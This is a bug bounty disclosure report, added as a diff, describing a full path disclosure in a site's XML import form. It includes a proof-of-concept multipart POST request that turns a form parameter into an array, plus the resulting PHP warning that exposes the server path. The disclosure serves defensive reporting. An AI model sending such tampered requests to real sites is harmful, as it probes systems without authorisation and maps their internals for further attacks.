@@ -1,0 +1,51 @@
+# HackerOne Report: Full Path Disclosure / Info Disclosure in Importing XML Section!
+**Report ID:** 8091
+**Vulnerability Class:** Information Disclosure
+
+## Vulnerability Information & PoC
+Hello,
+I found another information disclosure vulnerability/Full Path Disclosure on your application.
+now its on *Import XML* Section 
+
+Proof of Concept
+-------------------------
+
+POST  : http://www.localize.io/import/ [project ID]
+POST CONTENT: 
+`-----------------------------97823247315770\r\n
+Content-Disposition: form-data; name="CSRFToken"\r\n
+\r\n
+MTcwMTAzMDk2MDUzNTFjN2I1NGE5MWYxLjkzMjk2OTM0\r\n
+-----------------------------97823247315770\r\n
+Content-Disposition: form-data; name="import[overwrite][]"\r\n
+\r\n
+0\r\n
+-----------------------------97823247315770\r\n
+Content-Disposition: form-data; name="import[languageID]"\r\n
+\r\n
+0\r\n
+-----------------------------97823247315770\r\n
+Content-Disposition: form-data; name="import[groupID]"\r\n
+\r\n
+0\r\n
+-----------------------------97823247315770\r\n
+Content-Disposition: form-data; name="MAX_FILE_SIZE"\r\n
+\r\n
+1572864\r\n
+-----------------------------97823247315770\r\n
+Content-Disposition: form-data; name="importFileXML"; filename=""\r\n
+Content-Type: application/octet-stream\r\n
+\r\n
+\r\n
+-----------------------------97823247315770--\r\n`
+
+I just Added "[]" after *import[overwrite]* and Replied.
+
+### The information from page:
+> Warning: trim() expects parameter 1 to be string, array given in /var/www/vhosts/lvps178-77-99-228.dedicated.hosteurope.de/httpdocs_localize/index.php on line 410 
+
+I Also Added a Screenshot of that FPD as attachment..
+Hope You'll fix this one also..
+Thanks
+
+## Discussion & Remediation Timeline
